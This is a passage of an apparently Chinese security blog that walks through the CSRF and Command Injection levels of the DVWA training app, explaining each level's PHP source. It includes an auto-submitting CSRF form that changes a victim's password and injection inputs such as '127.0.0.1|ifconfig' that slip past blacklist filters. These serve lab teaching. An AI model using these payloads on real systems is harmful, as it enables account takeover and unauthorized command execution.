<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">'Change'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">'HTTP_REFERER'</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="literal">false</span> ) {</span><br><span class="line">            <span class="comment">// Get input</span></span><br><span class="line">            <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">'password_new'</span> ];</span><br><span class="line">            <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">'password_conf'</span> ];</span><br><span class="line">            <span class="comment">// Do the passwords match?</span></span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) {</span><br><span class="line">                <span class="comment">// They do!</span></span><br><span class="line">                <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">                <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">                <span class="comment">// Update the database</span></span><br><span class="line">                <span class="variable">$insert</span> = <span class="string">"UPDATE `users` SET password = '<span class="subst">$pass_new</span>' WHERE user = '"</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">"';"</span>;</span><br><span class="line">                <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">                <span class="comment">// Feedback for the user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="comment">// Issue with passwords matching</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>增加了验证请求头部的来源地址（Referer），来源地址与服务器地址一致才能修改密码。</p>
<p>从邮件中点击链接或者从另外网站点击无法修改密码。</p>
<p>验证的来源地址和服务器地址是否一致的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">'HTTP_REFERER'</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="literal">false</span> )</span><br></pre></td></tr></table></figure>

<p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p>
<p>语法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">stripos</span>(<span class="keyword">string</span>,find,start)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">string</td>
<td align="left">必需，规定被搜索的字符串</td>
</tr>
<tr>
<td align="left">find</td>
<td align="left">必需，规定要查找的字符</td>
</tr>
<tr>
<td align="left">start</td>
<td align="left">可选，规定开始搜索的位置</td>
</tr>
</tbody></table>
<p>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。<strong>注释：</strong>字符串位置从 0 开始，不是从 1 开始。</p>
<p>假如服务器的地址是 localhost(<code>$_SERVER[ 'SERVER_NAME' ]</code>)，而恶意的网站的地址是 xyz.club/localhost.php(<code>$_SERVER[ 'HTTP_REFERER' ]</code>) 仍然可以绕过。</p>
<p>localhost.php可以是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://192.168.0.110:5678/vulnerabilities/csrf/?"</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">    &lt;h1&gt;Click Me&lt;/h1&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"password_new"</span> value=<span class="string">"123456"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"123456"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Change"</span> name=<span class="string">"Change"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">"form"</span>)[<span class="number">0</span>].<span class="title function_ invoke__">submit</span>()</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">'Change'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">'password_new'</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">'password_conf'</span> ];</span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) {</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">"UPDATE `users` SET password = '<span class="subst">$pass_new</span>' WHERE user = '"</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">"';"</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>增加了Anti-CSRF token机制，可以防御绝大部分的CSRF利用；</p>
<p>只有获取token才能进行CSRF，但是游览器的同源策略，无法直接获取。</p>
<p>但是如果目标网站存在着存储性的XSS漏洞，可以利用存储型XSS漏洞来获取token，这个可以参考前面的文章，然后构造url和代码进行CSRF利用；</p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">'Change'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[ <span class="string">'password_current'</span> ];</span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">'password_new'</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">'password_conf'</span> ];</span><br><span class="line">        <span class="comment">// Sanitise current password input</span></span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">        <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_curr</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':user'</span>, <span class="title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':password'</span>, <span class="variable">$pass_curr</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &amp;&amp; ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) ) {</span><br><span class="line">            <span class="comment">// It does!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">            <span class="comment">// Update database with new password</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':password'</span>, <span class="variable">$pass_new</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':user'</span>, <span class="title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>必须输入正确的当前使用的密码，有进一步的身份检测机制；</p>
<p>同时增加stripslashes函数和PDO防护防止sql的注入；</p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA Command Injection</title>
    <url>/DVWA-Command-Injection.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>命令注入是未一些函数的参数做过滤或过滤不严导致的，可以执行系统或者应用指令（CMD命令或者bash命令）的一种注入攻击手段。<span id="more"></span>&gt;PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。</p>
<h1 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h1><p>利用命令注入，很多时候需要利用管道符，下面将分别介绍Windows和Linux的管道符；</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul>
<li>  <code>｜</code>，直接执行后面的语句，例如：<code>ping 127.0.0.1 | whoami</code>；</li>
<li>  <code>||</code>，如果前面的语句执行出错，则执行后面的语句；要执行后面的语句，前面的语句只能为假，例如：<code>ping 2 ｜| whoami</code>；</li>
<li>  <code>&amp;</code>，无论前面的语句的真假，都会执行两个语句，例如：<code>ping 2 &amp; whoami</code></li>
<li>  <code>&amp;&amp;</code>，如果前面的语句为假则直接出错，也不执行后面的语句；要执行后面的语句，前面的语句只能为真，例如：<code>ping 127.0.0.1 &amp;&amp; whoami</code>；</li>
</ul>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ul>
<li>  <code>；</code>，执行完前面的语句再执行后面的，例如: <code>ping 127.0.0.1;whoami</code>；</li>
<li>  <code>|</code>，只显示后面语句的执行结果，例如：<code>ping 127.0.0.1 | whoami</code>；</li>
<li>  <code>||</code>，当前面的语句执行出错时，执行后面的语句；要执行后面的语句，前面的语句只能为假，例如：<code>ping 1|| whoami</code>；</li>
<li>  <code>&amp;</code>， 无论前面的语句的真假，都会执行两个语句，例如：<code>ping 127.0.0.1 &amp; whoami</code>；</li>
<li>  <code>&amp;&amp;</code>，如果前面的语句为假则直接出错，也不执行后面的；要执行后面的语句，前面的语句只能为真，例如：<code>ping 127.0.0.1 &amp;&amp; whoami</code>；</li>
</ul>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) {</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ];</span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) {</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">'ping  '</span> . <span class="variable">$target</span> );</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> );</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;<span class="subst">{$cmd}</span>&lt;/pre&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>函数</p>
<ul>
<li><p><code>stristr(string,search,before_search)</code></p>
<p>  stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。</p>
<ul>
<li>  参数string规定被搜索的字符串，</li>
<li>  参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），</li>
<li>  可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，</li>
</ul>
<p>  函数将返回 search 参数第一次出现之前的字符串部分。</p>
</li>
<li><p>php_uname(mode)</p>
<p>  这个函数会返回运行php的操作系统的相关描述，参数mode可取值</p>
<ul>
<li>  <code>a</code> （此为默认，包含序列”snrvm”里的所有模式）</li>
<li>  <code>s </code>（返回操作系统名称）</li>
<li>  <code>n</code>（返回主机名）</li>
<li>  <code>r</code>（返回版本名称）</li>
<li>  <code>v</code>（返回版本信息）       </li>
<li>  <code>m</code>（返回机器类型）</li>
</ul>
</li>
</ul>
<p>功能：</p>
<p>获取 <code>IP</code> 的值，直接传参使用 <code>shell_exec</code> 执行。</p>
<ul>
<li>  <code>Windows</code> 的话执行 <code>ping</code> 命令。</li>
<li>  <code>linux</code> 的话，执行 <code>ping -c 4</code> 命令。</li>
</ul>
<p>未对输入数据做过滤处理，可以使用管道添加其他命令，达到攻击的目的；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201120141222.png"></p>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) {</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ];</span><br><span class="line">        <span class="comment">// Set blacklist</span></span><br><span class="line">        <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) {</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">'ping  '</span> . <span class="variable">$target</span> );</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> );</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;<span class="subst">{$cmd}</span>&lt;/pre&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p><code>str_replace</code>函数将<code>&amp;&amp;</code>,<code>;</code>替换为空字符，过滤了<code>&amp;&amp;</code>、<code>;</code>，但是其他 的符号仍然可用；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201120141534.png"></p>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) {</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]);</span><br><span class="line">        <span class="comment">// Set blacklist</span></span><br><span class="line">        <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'| '</span> =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) {</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">'ping  '</span> . <span class="variable">$target</span> );</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> );</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;<span class="subst">{$cmd}</span>&lt;/pre&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>黑名单看似过滤了所有的非法字符，但仔细观察到是把<code>|  </code>（注意这里|后有一个空格）替换为空字符，于是<code>|</code>就有用了；</p>
<p>输入<code>127.0.0.1|ifconfig</code>执行后面的命令；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201120143423.png"></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) {</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ];</span><br><span class="line">        <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line">        <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">        <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">"."</span>, <span class="variable">$target</span> );</span><br><span class="line">        <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">        <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( 